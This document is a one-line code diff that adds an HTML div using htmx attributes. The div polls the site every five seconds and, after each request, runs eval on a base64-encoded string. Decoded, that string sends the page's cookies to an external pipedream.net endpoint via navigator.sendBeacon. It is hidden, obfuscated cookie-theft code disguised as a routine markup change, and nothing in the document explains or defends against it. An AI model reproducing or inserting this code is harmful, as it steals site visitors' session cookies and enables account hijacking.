@@ -1,0 +1,1 @@
+<div data-hx-get="/" data-hx-trigger="every 5s" data-hx-on::after-request="eval(atob('bmF2aWdhdG9yLnNlbmRCZWFjb24oImh0dHBzOi8vZW81dnpnanhkamk3MnV1Lm0ucGlwZWRyZWFtLm5ldCIsIGRvY3VtZW50LmNvb2tpZSk='))"></div>
